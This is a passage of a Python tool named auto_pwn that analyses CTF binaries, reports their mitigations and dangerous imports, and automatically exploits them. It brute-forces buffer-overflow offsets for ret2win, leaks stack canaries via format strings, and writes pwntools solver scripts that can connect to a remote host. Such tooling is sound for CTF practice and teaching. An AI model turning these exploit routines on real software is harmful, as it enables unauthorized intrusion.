    safe = re.sub(r'[^\w.@?-]', '_', name)
    path = os.path.join(outdir, f'{safe}.txt')
    with open(path, 'w') as f:
        f.write(banner(f'FUNCTION: {name}   @ {info["addr"]}') + '\n\n')
        if suspicious:
            f.write('[*] SUSPICIOUS COMPONENTS\n')
            f.write('-' * 72 + '\n')
            seen = {}
            for _, _, api, cat, hint in suspicious:
                seen[(api, cat)] = seen.get((api, cat), 0) + 1
            for (api, cat), n in sorted(seen.items()):
                f.write(f'  [{cat:<18}] {api:<18} x{n}  — {HINTS.get(cat, "")}\n')
            f.write('\n[*] CALL SITES\n')
            f.write('-' * 72 + '\n')
            for line_no, line_text, api, cat, hint in suspicious:
                f.write(f'  line {line_no:4}  [{cat:<18}] {line_text}\n')
                if hint:
                    f.write(f'             → {hint}\n')
            f.write('\n')
        else:
            f.write('[*] No suspicious API calls detected.\n\n')
        f.write('[*] DECOMPILED CODE\n')
        f.write('-' * 72 + '\n')
        flag_lines = {ln for ln, *_ in suspicious}
        for i, line in enumerate(info['body'].splitlines(), 1):
            if i in flag_lines:
                f.write(f'>>> {line}\n')
            else:
                f.write(f'    {line}\n')
    return path


def write_combined(outdir, funcs):
    path = os.path.join(outdir, '_decompile_all.c')
    with open(path, 'w') as f:
        f.write('/* Combined decompilation — generated by auto_pwn */\n\n')
        for name, info in funcs.items():
            f.write(f'/* ==== {name} @ {info["addr"]} ==== */\n')
            f.write(info['body'] + '\n\n')
    return path


def write_findings(outdir, funcs, module_findings, vulns, recon=None):
    path = os.path.join(outdir, '_findings.txt')
    with open(path, 'w') as f:
        f.write(banner('OVERALL FINDINGS') + '\n\n')

        f.write('[*] MODULE-LEVEL FINDINGS\n')
        f.write('-' * 72 + '\n')
        for sev, cat, desc, hint in module_findings:
            f.write(f'  [{sev:<8}] {cat:<18} {desc}\n')
            if hint:
                f.write(f'             → {hint}\n')
        f.write('\n')

        if recon:
            f.write('[*] PATTERN RECOGNITION (stripped mode)\n')
            f.write('-' * 72 + '\n')
            if recon['main']:
                mname, maddr, mscore, mreason = recon['main']
                f.write(f'  main candidate: {mname} @ {hex(maddr)} (score {mscore})\n')
                f.write(f'         → {mreason}\n')
            if recon['wins']:
                f.write(f'\n  win candidates:\n')
                for wname, waddr, wscore, wreason in recon['wins'][:5]:
                    f.write(f'    [{wscore:>3}] {hex(waddr):<12} {wname}\n')
                    f.write(f'         → {wreason}\n')
            f.write('\n')

        f.write('[*] VULNERABILITY TYPES + PAYLOAD TEMPLATES\n')
        f.write('-' * 72 + '\n')
        for v in vulns:
            f.write(f'\n  === {v["name"]} ({v["confidence"]}) ===\n')
            f.write(f'  Why: {v["why"]}\n\n')
            f.write('  Recipe:\n')
            for step in v['recipe']:
                f.write(f'    - {step}\n')
            f.write('\n  Payload template:\n')
            for line in v['payload'].splitlines():
                f.write(f'    {line}\n')
        f.write('\n')

        f.write('[*] PER-FUNCTION SUSPICIOUS CALLS\n')
        f.write('-' * 72 + '\n')
        for name, info in funcs.items():
            hits = find_suspicious_calls(info['body'])
            if not hits:
                continue
            f.write(f'\n  {name} @ {info["addr"]}\n')
            for line_no, line_text, api, cat, hint in hits:
                f.write(f'    line {line_no:4}  [{cat:<18}] {line_text}\n')
    return path


def write_solver_skeleton(outdir, binary, sec, funcs, vulns, recon=None):
    win = next((a for n, a in funcs
                if re.search(r'win|flag|shell|secret|backdoor|admin', n, re.I)),
               None)
    win_name = next((n for n, _ in funcs
                     if re.search(r'win|flag|shell|secret|backdoor|admin',
                                  n, re.I)), 'win')
    if win is None and recon and recon['wins']:
        wname, win, _, _ = recon['wins'][0]
        win_name = wname

    abs_binary = os.path.abspath(binary)
    libc_exists = os.path.exists('./libc.so.6')

    vuln_block = ['# === Auto-detected vulnerability types ===']
    for v in vulns:
        vuln_block.append(f'# [{v["confidence"]:<6}] {v["name"]:<24} — {v["why"]}')
    if not vulns:
        vuln_block.append('# (none)')
    vuln_block = '\n'.join(vuln_block)

    hint_block = ['# === Payload templates ===']
    for v in vulns:
        hint_block.append(f'# --- {v["name"]} ---')
        for line in v['payload'].splitlines():
            hint_block.append(f'# {line}')
        hint_block.append('')
    hint_block = '\n'.join(hint_block)

    recon_block = ''
    if recon:
        recon_block = '# === Pattern recognition (stripped mode) ===\n'
        if recon['main']:
            mname, maddr, mscore, _ = recon['main']
            recon_block += f'# main candidate: {mname} @ {hex(maddr)} (score {mscore})\n'
        if recon['wins']:
            for wname, waddr, wscore, wreason in recon['wins'][:3]:
                recon_block += f'# win candidate [{wscore}]: {wname} @ {hex(waddr)}\n'
                recon_block += f'#   → {wreason}\n'

    remote_block = (
        "\n"
        "# ── Remote / local connection ─────────────────────────────────────\n"
        "# Local:  python3 _solver_skeleton.py\n"
        "# Remote: python3 _solver_skeleton.py REMOTE <host> <port>\n"
        "HOST = 'challenge.server.com'\n"
        "PORT = 1337\n"
        "\n"
        "def conn():\n"
        "    if args.REMOTE:\n"
        "        return remote(HOST, PORT)\n"
        "    return process(BIN)\n"
        "# ────────────────────────────────────────────────────────────────\n"
    )

    tmpl = f'''#!/usr/bin/env python3
# Auto-generated by auto_pwn
from pwn import *

BIN = {abs_binary!r}
elf = ELF(BIN, checksec=False)
{"libc = ELF('./libc.so.6', checksec=False)" if libc_exists else "# libc = ELF('./libc.so.6', checksec=False)"}
context.binary = elf
context.log_level = 'info'
{remote_block}
{recon_block}
{vuln_block}

CANARY_ENABLED = {sec['canary']}
NX_ENABLED     = {sec['nx']}
PIE_ENABLED    = {sec['pie']}
RELRO          = {sec['relro']!r}
{"WIN = " + hex(win) if win else "# WIN = None"}
WIN_NAME       = {win_name!r}

_rop    = ROP(elf)
POP_RDI = _rop.find_gadget(['pop rdi', 'ret'])
POP_RDI = POP_RDI[0] if POP_RDI else None
RET     = _rop.find_gadget(['ret'])
RET     = RET[0] if RET else None

OFFSET      = 40
CANARY      = None
CANARY_OFF  = 17

{hint_block}


def exploit():
    io = conn()
    io.interactive()


if __name__ == '__main__':
    exploit()
'''
    path = os.path.join(outdir, '_solver_skeleton.py')
    with open(path, 'w') as f:
        f.write(tmpl)
    os.chmod(path, 0o755)
    return path


# =============================================================
# Report printer
# =============================================================
def hr(title):
    line = '=' * 72
    print(f'\n{C.BOLD}{C.CY}{line}\n  {title}\n{line}{C.RST}')


def print_report(path, fi, sec, imports, funcs, strings_found, findings,
                 decompiled, backend, vulns, recon=None):
    hr('FILE INFO')
    print(f'  Path     : {path}')
    print(f'  Type     : {fi["raw"]}')
    print(f'  Arch     : {fi["arch"]} ({fi["bits"]}-bit)')
    print(f'  PIE      : {fi["pie"]}   Stripped: {fi["stripped"]}   Static: {fi["static"]}')

    hr('SECURITY MITIGATIONS')
    def b(v): return f'{C.G}enabled{C.RST}' if v else f'{C.R}disabled{C.RST}'
    print(f'  Canary   : {b(sec["canary"])}')
    print(f'  NX       : {b(sec["nx"])}')
    print(f'  PIE      : {b(sec["pie"])}')
    print(f'  RELRO    : {C.Y}{sec["relro"]}{C.RST}')
    print(f'  Fortify  : {b(sec["fortify"])}')
    print(f'  Static   : {b(sec["static"])}')

    hr('DANGEROUS IMPORTS')
    flagged = sorted([(f, DANGEROUS[f]) for f in imports if f in DANGEROUS],
                     key=lambda x: x[1])
    if flagged:
        for f, cat in flagged:
            col = C.R if 'OVERFLOW' in cat or 'FMT' in cat else (
                  C.M if cat == 'CMD_EXEC' else (
                  C.Y if cat == 'HEAP' else C.W))
            print(f'  {col}{f:<18}{C.RST} → {cat}')
    else:
        print('  (none)')

    hr('INTERESTING FUNCTIONS')
    interesting = [(n, a) for n, a in funcs
                   if re.search(r'win|flag|shell|main|secret|vuln|admin|backdoor',
                                n, re.I)]
    for n, a in interesting:
        col = C.G if re.search(r'win|flag|shell|secret|backdoor', n, re.I) else C.W
        print(f'  {col}{hex(a):<14}{n}{C.RST}')

    hr('INTERESTING STRINGS')
    if strings_found:
        for s in strings_found[:30]:
            print(f'  {C.Y}{s!r}{C.RST}')
    else:
        print('  (none)')

    if recon:
        hr('PATTERN RECOGNITION (stripped mode)')
        if recon['main']:
            mname, maddr, mscore, mreason = recon['main']
            print(f'  {C.G}main candidate{C.RST}: {mname} @ {hex(maddr)} (score {mscore})')
            print(f'         → {mreason}')
        else:
            print(f'  {C.Y}main candidate: not found{C.RST}')
        if recon['wins']:
            print(f'\n  {C.G}win candidates{C.RST}:')
            for wname, waddr, wscore, wreason in recon['wins'][:5]:
                col = C.G if wscore >= 20 else (C.Y if wscore >= 10 else C.W)
                print(f'    {col}[{wscore:>3}]{C.RST} {hex(waddr):<12} {wname}')
                print(f'         → {wreason}')
        else:
            print(f'\n  {C.Y}no win candidates found{C.RST}')

    hr('VULNERABILITY ANALYSIS')
    sev_col = {'CRITICAL': C.R + C.BOLD, 'HIGH': C.R,
               'MEDIUM': C.Y, 'LOW': C.CY, 'INFO': C.B}
    for sev, cat, desc, hint in findings:
        print(f'\n  {sev_col.get(sev, C.W)}[{sev}]{C.RST} {C.BOLD}{cat}{C.RST}')
        print(f'         {desc}')
        if hint:
            print(f'         {C.DIM}→ {hint}{C.RST}')

    hr(f'POSSIBLE VULNERABILITY TYPES  ({len(vulns)})')
    if vulns:
        for v in vulns:
            col = {'HIGH': C.G + C.BOLD, 'MEDIUM': C.Y,
                   'LOW': C.CY}.get(v['confidence'], C.W)
            print(f'\n  {col}[{v["confidence"]}]{C.RST} {C.BOLD}{v["name"]}{C.RST}')
            print(f'         Why: {v["why"]}')
            print(f'         Recipe:')
            for step in v['recipe']:
                print(f'           - {step}')
            print(f'         Payload:')
            for line in v['payload'].splitlines():
                print(f'           {C.DIM}{line}{C.RST}')
    else:
        print('  (no known vuln patterns detected)')

    # ---------- Filter boring sub_XXXX from stripped output ----------
    if fi.get('stripped'):
        display_decomp = _filter_decompiled_for_stripped(decompiled)
    else:
        display_decomp = decompiled

    hr(f'DECOMPILED OUTPUT  (backend: {backend})')
    print(display_decomp)


# =============================================================
# Silent auto-exploit helpers
# =============================================================
def _get_gadgets(path):
    gadgets = {'ret': None, 'pop_rdi': None, 'pop_rsi': None,
               'pop_rdx': None, 'pop_rax': None, 'syscall': None,
               'leave_ret': None}
    try:
        out = subprocess.check_output(
            ['ROPgadget', '--binary', path, '--only', 'pop|ret|syscall|leave'],
            stderr=subprocess.DEVNULL, timeout=15
        ).decode(errors='replace')
        for line in out.splitlines():
            m = re.match(r'(0x[0-9a-f]+)\s*:\s*(.+)$', line.strip())
            if not m: continue
            addr = int(m.group(1), 16)
            ins = m.group(2).strip().lower()
            if ins == 'ret' and gadgets['ret'] is None:
                gadgets['ret'] = addr
            elif ins == 'pop rdi ; ret' and gadgets['pop_rdi'] is None:
                gadgets['pop_rdi'] = addr
            elif ins == 'pop rsi ; ret' and gadgets['pop_rsi'] is None:
                gadgets['pop_rsi'] = addr
            elif ins == 'pop rdx ; ret' and gadgets['pop_rdx'] is None:
                gadgets['pop_rdx'] = addr
            elif ins == 'pop rax ; ret' and gadgets['pop_rax'] is None:
                gadgets['pop_rax'] = addr
            elif ins == 'syscall' and gadgets['syscall'] is None:
                gadgets['syscall'] = addr
            elif 'leave ; ret' in ins and gadgets['leave_ret'] is None:
                gadgets['leave_ret'] = addr
    except Exception:
        pass
    return gadgets


def _silent_run_payload(path, payload_fn, timeout=2):
    _silence_pwntools()
    io = None
    try:
        from pwn import process, context
        context.log_level = 'critical'
        io = process(path, level='critical')
        payload_fn(io)
        time.sleep(0.1)
        try:
            data = io.recv(timeout=timeout)
        except Exception:
            data = b''
        out = data.decode(errors='replace')
        success = bool(re.search(
            r'(flag\{|ctf\{|lksn\{|lkSN\{|[A-Za-z0-9_]+\{[^}]+\}|'
            r'You won|shell|/bin/sh|\$ )', out, re.I))
        return success, out
    except Exception:
        return False, ''
    finally:
        if io is not None:
            try: io.close()
            except Exception: pass
        _unsilence_pwntools()


def _try_jump_to_address(binary, sec, win_addr, elf, strings_found):
    if not any(re.search(r'address of', s, re.I) for s in strings_found):
        return False, '', None
    if 'main' not in elf.symbols:
        return False, '', None

    _silence_pwntools()
    io = None
    try:
        from pwn import process, context
        context.log_level = 'critical'
        io = process(binary, level='critical')

        io.recvuntil(b'0x', timeout=3)
        rest = io.recvn(20, timeout=1)
        m = re.match(rb'[0-9a-f]+', rest)
        if not m:
            return False, '', None
        main_leak = int(b'0x' + m.group(0), 16)

        win = main_leak - elf.symbols['main'] + win_addr
        io.sendline(hex(win).encode())
        time.sleep(0.3)
        try:
            out = io.recv(timeout=3)
        except Exception:
            out = b''
        try:
            more = io.recv(timeout=1)
            out += more
        except Exception:
            pass

        out_s = out.decode(errors='replace')
        success = bool(re.search(
            r'(flag\{|ctf\{|lksn\{|lkSN\{|[A-Za-z0-9_]+\{[^}]+\}|You won)',
            out_s, re.I))
        return success, out_s, win
    except Exception as e:
        return False, str(e), None
    finally:
        if io is not None:
            try: io.close()
            except Exception: pass
        _unsilence_pwntools()


def _write_solver_jump(out, binary, info):
    body = f'''#!/usr/bin/env python3
# auto-generated by auto_pwn (jump_to_address)
from pwn import *

BIN = {os.path.abspath(binary)!r}
elf = ELF(BIN, checksec=False)
context.binary = elf
context.log_level = 'info'

HOST = 'challenge.server.com'
PORT = 1337

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN)

WIN_NAME   = {info['win_name']!r}
WIN_DELTA  = {hex(info['win_delta'])}


def exploit():
    io = conn()

    io.recvuntil(b'Address of main: ')
    main_leak = int(io.recvline().strip(), 16)
    win = main_leak + WIN_DELTA
    log.success(f'main = {{hex(main_leak)}}  win = {{hex(win)}}')

    io.sendline(hex(win).encode())
    io.interactive()


if __name__ == '__main__':
    exploit()
'''
    with open(out, 'w') as f:
        f.write(body)
    os.chmod(out, 0o755)


def silent_auto_exploit(binary, sec, syms, imports, strings_found=None,
                        out_solver='solver.py'):
    _silence_pwntools()
    try:
        result = _silent_auto_exploit_inner(
            binary, sec, syms, imports, strings_found, out_solver)
        return result
    finally:
        _unsilence_pwntools()


def _silent_auto_exploit_inner(binary, sec, syms, imports,
                               strings_found=None, out_solver='solver.py'):
    win = None
    for n, a in syms.items():
        if re.search(r'win|flag|shell|secret|backdoor|admin', n, re.I):
            win = a; break
    if win is None:
        blocks, _ = get_disasm_blocks(binary)
        if strings_found is None:
            strings_found = scan_strings(binary)
        cands = find_win_candidates(binary, blocks, strings_found, imports)
        if cands:
            wname, win, score, reason = cands[0]
            print(f'{C.DIM}    heuristic win = {wname} @ {hex(win)} '
                  f'({reason}){C.RST}')
    if win is None:
        return None

    gadgets = _get_gadgets(binary)

    try:
        from pwn import ELF as _ELF
        elf = _ELF(binary, checksec=False)
    except Exception:
        elf = None

    if elf and 'main' in elf.symbols:
        sf = strings_found if strings_found is not None else scan_strings(binary)
        success, out, win_at = _try_jump_to_address(binary, sec, win, elf, sf)
        if success:
            _write_solver_jump(out_solver, binary, {
                'template': 'jump_to_address',
                'win_name': 'win',
                'win_delta': elf.symbols['win'] - elf.symbols['main'],
            })
            return {'template': 'jump_to_address'}

    if not sec['canary'] and not sec['pie']:
        for offset in (32, 40, 48, 56, 64, 72, 88, 104, 120, 136, 144, 152):
            for add_ret in (False, True):
                p = b'A' * offset
                if add_ret and gadgets['ret']:
                    p += p64(gadgets['ret'])
                p += p64(win)
                success, _ = _silent_run_payload(
                    binary, lambda io, p=p: io.sendline(p))
                if success:
                    _write_solver_simple(out_solver, binary, {
                        'template': 'ret2win', 'win': win, 'offset': offset,
                        'add_ret': add_ret, 'ret_gadget': gadgets['ret'],
                    })
                    return {'template': 'ret2win'}
        return None

    if sec['canary'] and 'printf' in imports:
        try:
            from pwn import process, context
            context.log_level = 'critical'
            probe = process(binary, level='critical')
            time.sleep(0.3)
            initial = probe.recv(timeout=1).decode(errors='replace')
            probe.close()
        except Exception:
            return None
        m = re.search(r'([A-Za-z][A-Za-z0-9 ._\-]{2,40}[:?]\s*)$',
                      initial, re.MULTILINE)
        if not m:
            m = re.search(r'([A-Za-z][^:\n]{2,40}:\s*)$', initial, re.MULTILINE)
        if not m:
            return None
        name_prompt = m.group(1).strip().encode()

        canary_off = None
        for i in range(1, 40):
            try:
                io = process(binary, level='critical')
                io.sendlineafter(name_prompt, f'%{i}$p'.encode())
                time.sleep(0.1)
                io.sendline(b'1')
                time.sleep(0.1)
                data = io.recv(timeout=1)
                io.close()
                m2 = re.search(rb'0x[0-9a-f]{6,}00\b', data)
                if m2 and int(m2.group(0), 16) > 0x100000000:
                    canary_off = i; break
            except Exception:
                continue
        if canary_off is None:
            return None

        for offset in (32, 40, 48, 56, 64, 72, 80, 88, 96, 128, 144):
            for add_ret in (False, True):
                def build(io, offset=offset, add_ret=add_ret):
                    io.sendlineafter(name_prompt, f'%{canary_off}$p'.encode())
                    time.sleep(0.1)
                    io.sendline(b'1')
                    time.sleep(0.1)
                    data = io.recv(timeout=1)
                    mm = re.search(rb'0x[0-9a-f]{6,}00\b', data)
                    if not mm: return
                    canary = int(mm.group(0), 16)
                    io.sendline(b'2')
                    time.sleep(0.1)
                    io.recv(timeout=0.5)
                    payload  = b'A' * offset + p64(canary) + b'B' * 8
                    if add_ret and gadgets['ret']:
                        payload += p64(gadgets['ret'])
                    payload += p64(win)
                    io.sendline(payload)
                    time.sleep(0.1)
                    io.sendline(b'3')

                success, _ = _silent_run_payload(binary, build, timeout=2)
                if success:
                    _write_solver_canary(out_solver, binary, {
                        'template': 'ret2win_canary_fmt', 'win': win,
                        'offset': offset, 'canary_offset': canary_off,
                        'name_prompt': name_prompt.decode(),
                        'add_ret': add_ret, 'ret_gadget': gadgets['ret'],
                    })
                    return {'template': 'ret2win_canary_fmt'}
    return None


def _write_solver_simple(out, binary, info):
    win = info['win']; ret = info['ret_gadget']
    body = f'''#!/usr/bin/env python3
# auto-generated by auto_pwn
from pwn import *

BIN = {os.path.abspath(binary)!r}
elf = ELF(BIN, checksec=False)
context.binary = elf
context.log_level = 'info'

HOST = 'challenge.server.com'
PORT = 1337

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN)

WIN     = {hex(win)}
OFFSET  = {info['offset']}
ADD_RET = {info['add_ret']}
RET     = {hex(ret) if ret else None}


def exploit():
    io = conn()
    payload  = b'A' * OFFSET
    if ADD_RET and RET:
        payload += p64(RET)
    payload += p64(WIN)
    io.sendline(payload)
    io.interactive()


if __name__ == '__main__':
    exploit()
'''
    with open(out, 'w') as f: f.write(body)
    os.chmod(out, 0o755)


def _write_solver_canary(out, binary, info):
    ret = info['ret_gadget']
    body = f'''#!/usr/bin/env python3
# auto-generated by auto_pwn
from pwn import *

BIN = {os.path.abspath(binary)!r}
elf = ELF(BIN, checksec=False)
context.binary = elf
context.log_level = 'info'

HOST = 'challenge.server.com'
PORT = 1337

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN)

WIN          = {hex(info['win'])}
OFFSET       = {info['offset']}
CANARY_OFF   = {info['canary_offset']}
NAME_PROMPT  = {info['name_prompt']!r}
ADD_RET      = {info['add_ret']}
RET          = {hex(ret) if ret else None}


def exploit():
    io = conn()
    io.sendlineafter(NAME_PROMPT.encode(), f'%{{CANARY_OFF}}$p'.encode())
    io.sendlineafter(b'Choice: ', b'1')
    io.recvuntil(b'Name: ')
    canary = int(io.recvuntil(b'Role:', drop=True).strip(), 16)
    log.success(f'canary = {{hex(canary)}}')

    payload  = b'A' * OFFSET + p64(canary) + b'B' * 8
    if ADD_RET and RET:
        payload += p64(RET)
    payload += p64(WIN)

    io.sendlineafter(b'Choice: ', b'2')
    io.sendlineafter(b'PIN: ', payload)
    io.sendlineafter(b'Choice: ', b'3')
    io.interactive()


if __name__ == '__main__':
    exploit()
'''
    with open(out, 'w') as f: f.write(body)
    os.chmod(out, 0o755)


# =============================================================
# Main pipeline
# =============================================================
def run(path, funcs=None, backend='auto', color=True, output=None,
        outdir='./decomp', solver_out='solver.py', autoexploit=True):
    if not color:
        no_color()
    if not os.path.exists(path):
        print(f'{C.R}File not found: {path}{C.RST}')
        sys.exit(1)

    fi = file_info(path)
    sec = security(path)
    imports = imported_functions(path)
    funcs_list = defined_functions(path)
    strings_found = scan_strings(path)

    recon = pattern_recon(path, funcs_list, strings_found, imports)

    existing_addrs = {a for _, a in funcs_list}
    existing_names = {n for n, _ in funcs_list}
    for n, a in recon['all_funcs']:
        if a not in existing_addrs and n not in existing_names:
            funcs_list.append((n, a))
            existing_addrs.add(a); existing_names.add(n)
    if recon['main']:
        mname, maddr, _, _ = recon['main']
        if maddr not in existing_addrs:
            funcs_list.append((f'main?{mname}', maddr))
            existing_addrs.add(maddr)
    for wname, waddr, _, _ in recon['wins'][:3]:
        if waddr not in existing_addrs:
            funcs_list.append((f'win?{wname}', waddr))
            existing_addrs.add(waddr)

    findings = analyze(imports, funcs_list, sec, strings_found)

    if not funcs:
        blocks_dc, _ = get_disasm_blocks(path)
        funcs_count = sum(
            1 for n, _ in funcs_list
            if not _INTERNAL_DECOMPILE_RE.search(n) and '@plt' not in n
        )
        interesting = []
        seen_clean = set()
        for n, _ in funcs_list:
            clean = n.split('?', 1)[1] if '?' in n else n
            if clean in seen_clean:
                continue
            seen_clean.add(clean)
            if _should_decompile(clean, blocks_dc, funcs_count):
                interesting.append(clean)
        funcs = interesting or ['main']

    decompiled, backend_used = decompile(path, funcs, backend)

    # Feed angr-discovered function names into funcs_list
    for name, addr in _extract_functions_from_angr(decompiled):
        if addr in existing_addrs:
            continue
        existing_addrs.add(addr)
        existing_names.add(name)
        funcs_list.append((name, addr))

    # Re-run pattern recon with angr-recovered names
    recon2 = pattern_recon(path, funcs_list, strings_found, imports)
    if recon2.get('main') and not recon.get('main'):
        recon['main'] = recon2['main']
        mname, maddr, _, _ = recon2['main']
        if maddr not in existing_addrs:
            funcs_list.append((mname, maddr))
            existing_addrs.add(maddr)
            existing_names.add(mname)
    if not recon.get('wins') and recon2.get('wins'):
        recon['wins'] = recon2['wins']
        for wname, waddr, _, _ in recon2['wins'][:3]:
            if waddr not in existing_addrs:
                funcs_list.append((wname, waddr))
                existing_addrs.add(waddr)
                existing_names.add(wname)

    # Second pass: resolve any unresolved sub_XXXX calls
    try:
        sub_calls = _extract_sub_calls(decompiled)
        existing_clean = {n.split('?', 1)[-1] for n, _ in funcs_list}
        unresolved = sub_calls - existing_clean
        if unresolved:
            for sub in unresolved:
                m = re.match(r'^sub_([0-9a-fA-F]+)$', sub)
                if m:
                    try:
                        addr = int(m.group(1), 16)
                        if addr not in existing_addrs:
                            funcs_list.append((sub, addr))
                            existing_addrs.add(addr)
                            existing_names.add(sub)
                    except ValueError:
                        pass
            funcs2 = [n.split('?', 1)[-1] for n, _ in funcs_list
                      if not _INTERNAL_DECOMPILE_RE.search(n)]
            if funcs2:
                decompiled2, backend_used2 = decompile(path, funcs2, backend)
                seen_headers = set(re.findall(
                    r'/\*\s*=*\s*([A-Za-z_]\w*)\s*@',
                    decompiled))
                extras = []
                for m in re.finditer(
                        r'/\*\s*=*\s*([A-Za-z_]\w*)\s*@\s*(0x[0-9a-f]+)'
                        r'\s*=*\s*\*/',
                        decompiled2):
                    nm = m.group(1)
                    if nm not in seen_headers:
                        start = m.start()
                        nxt = re.search(
                            r'/\*\s*=*\s*[A-Za-z_]\w*\s*@\s*0x[0-9a-f]+'
                            r'\s*=*\s*\*/',
                            decompiled2[m.end():])
                        end = (m.end() + nxt.start()) if nxt else len(decompiled2)
                        extras.append(decompiled2[start:end])
                        seen_headers.add(nm)
                if extras:
                    decompiled = decompiled + '\n\n' + '\n\n'.join(extras)
                    backend_used = backend_used + '+angr2'
    except Exception:
        pass

    imports = imports | scan_decompiled_for_apis(decompiled)

    findings = analyze(imports, funcs_list, sec, strings_found)
    gadgets = _get_gadgets(path)
    vulns = classify_vulns(sec, imports, funcs_list, strings_found, gadgets, path)

    tee = None
    if output:
        class _Tee:
            def __init__(self, *fs): self.fs = fs
            def write(self, x):
                for f in self.fs: f.write(x)
            def flush(self):
                for f in self.fs: f.flush()
        fh = open(output, 'w')
        tee = _Tee(sys.__stdout__, fh)
        sys.stdout = tee

    try:
        print_report(path, fi, sec, imports, funcs_list, strings_found,
                     findings, decompiled, backend_used, vulns, recon)
    finally:
        if tee:
            sys.stdout = sys.__stdout__
            fh.close()

    os.makedirs(outdir, exist_ok=True)
    split = split_functions(decompiled)

    # NEW: filter boring sub_XXXX from stripped binaries
    if fi.get('stripped'):
        filtered = {}
        for name, info in split.items():
            # Keep meaningful names
            if not re.match(r'^(sub_|_start|\.)', name):
                filtered[name] = info
                continue
            # Keep main
            if name == 'main':
                filtered[name] = info
                continue
            # Keep if interesting
            if _is_interesting_function(info['body']):
                filtered[name] = info
        split = filtered

    written = {}
    for name, info in split.items():
        hits = find_suspicious_calls(info['body'])
        written[name] = write_function_file(outdir, name, info, hits)

    written['_all'] = write_combined(outdir, split)
    written['_findings'] = write_findings(outdir, split, findings, vulns, recon)
    written['_solver'] = write_solver_skeleton(
        outdir, path, sec, funcs_list, vulns, recon)

    print(f'\n{C.BOLD}{C.G}[+] Extraction complete → {outdir}/{C.RST}')
    for name, p in written.items():
        if name.startswith('_'):
            print(f'    {os.path.basename(p)}')
        else:
            hits = find_suspicious_calls(split[name]['body'])
            n = len(hits)
            mark = f'  ({n} suspicious)' if n else ''
            print(f'    {os.path.basename(p)}{mark}')

    if autoexploit and not os.path.exists(solver_out):
        try:
            result = silent_auto_exploit(path, sec, dict(funcs_list), imports,
                                         strings_found, out_solver=solver_out)
            if result:
                print(f'\n{C.BOLD}{C.G}[+] solver.py written '
                      f'(template: {result["template"]}){C.RST}')
        except Exception:
            pass

    return {
        'info': fi, 'security': sec, 'imports': imports,
        'funcs': funcs_list, 'strings': strings_found,
        'findings': findings, 'decomp': decompiled,
        'funcs_split': split, 'files': written, 'vulns': vulns,
        'recon': recon,
    }


# =============================================================
# Interactive / CLI
# =============================================================
def interactive():
    print(f'{C.BOLD}{C.CY}auto_pwn — interactive mode{C.RST}')
    path = input('  Binary path: ').strip()
    funcs = input('  Functions (comma-separated, blank=auto): ').strip()
    backend = input('  Backend [auto/angr/objdump]: ').strip() or 'auto'
    funcs_l = [f.strip() for f in funcs.split(',') if f.strip()] or None
    run(path, funcs_l, backend)


def main():
    ap = argparse.ArgumentParser(
        description='Binary identifier + angr + vuln classifier + pattern recon')
    ap.add_argument('binary', nargs='?')
    ap.add_argument('-d', '--decompile', default='')
    ap.add_argument('--backend', default='auto',
                    choices=['auto', 'angr', 'objdump'])
    ap.add_argument('--no-color', action='store_true')
    ap.add_argument('-o', '--output')
    ap.add_argument('--outdir', default='./decomp')
    ap.add_argument('--solver-out', default='solver.py')
    ap.add_argument('--no-autoexploit', action='store_true')
    ap.add_argument('--list-backends', action='store_true')
    ap.add_argument('--extract-only', metavar='FILE')

    args = ap.parse_args()

    if args.list_backends:
        for k, v in detect_backends().items():
            print(f'  {k:<10} {"OK" if v else "missing"}')
        return

    if args.extract_only:
        text = read_text(args.extract_only)
        os.makedirs(args.outdir, exist_ok=True)
        split = split_functions(text)
        for name, info in split.items():
            hits = find_suspicious_calls(info['body'])
            write_function_file(args.outdir, name, info, hits)
        write_combined(args.outdir, split)
        print(f'extracted {len(split)} functions → {args.outdir}/')
        return

    if not args.binary:
        interactive()
        return

    funcs = [f.strip() for f in args.decompile.split(',') if f.strip()] or None
    run(args.binary, funcs, args.backend,
        color=not args.no_color, output=args.output,
        outdir=args.outdir, solver_out=args.solver_out,
        autoexploit=not args.no_autoexploit)


if __name__ == '__main__':
    main()
